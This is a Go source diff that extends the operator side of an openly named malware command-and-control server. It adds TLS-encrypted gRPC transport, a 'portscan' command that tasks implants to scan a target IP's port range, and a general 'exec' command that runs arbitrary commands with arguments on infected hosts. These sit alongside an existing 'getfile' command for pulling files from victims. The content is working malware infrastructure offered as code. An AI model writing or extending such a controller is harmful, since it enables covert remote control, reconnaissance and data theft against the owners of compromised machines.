@@ -4,14 +4,15 @@ import (
 	"bufio"
 	"context"
 	"fmt"
+	"google.golang.org/grpc/credentials"
 	"io/ioutil"
 	"malware/common"
+	pb "malware/common/messages"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"time"
-
-	pb "malware/common/messages"
 
 	"google.golang.org/grpc"
 )
@@ -19,6 +20,10 @@ import (
 type c2 struct {
 	port  int
 	queue chan *pb.CheckCmdReply
+}
+
+func (c2 *c2) handleReply(reply *pb.ImplantReply) {
+	fmt.Println("Reply", reply)
 }
 
 func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
@@ -35,7 +40,7 @@ func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb
 		default:
 		}
 	case *pb.CheckCmdRequest_Reply:
-		fmt.Println("Reply", u)
+		c2.handleReply(u.Reply)
 	default:
 		common.Panic("Didn't receive a valid message", req, u)
 	}
@@ -48,8 +53,13 @@ func (c2 *c2) ReadUserInput() {
 		text, _ := reader.ReadString('\n')
 		parts := strings.Split(strings.TrimSpace(text), " ")
 		switch parts[0] {
-		case "ls":
-			message := &pb.Exec{Exec: "ls", Args: []string{}}
+		case "portscan":
+			start, _ := strconv.Atoi(parts[2])
+			end, _ := strconv.Atoi(parts[3])
+			message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
+			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
+		case "exec":
+			message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
 			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
 		case "getfile":
 			message := &pb.GetFile{Filename: parts[1]}
@@ -70,7 +80,10 @@ func (c2 *c2) ReadUserInput() {
 }
 
 func main() {
-	c2 := &c2{port: 2000, queue: make(chan *pb.CheckCmdReply, 100)}
+	// TODO: Replace with %PORT%
+	// TODO: Replacewith %certfile% %keyfile%
+	creds, _ := credentials.NewServerTLSFromFile("MyCertificate.crt", "MyKey.key")
+	c2 := &c2{port: 8000, queue: make(chan *pb.CheckCmdReply, 100)}
 	host := fmt.Sprintf(":%d", c2.port)
 	listener, err := net.Listen("tcp", host)
 
@@ -80,7 +93,8 @@ func main() {
 
 	defer listener.Close()
 
-	server := grpc.NewServer()
+	server := grpc.NewServer(grpc.Creds(creds))
+
 	pb.RegisterMalwareServer(server, c2)
 	go c2.ReadUserInput()
 	server.Serve(listener)
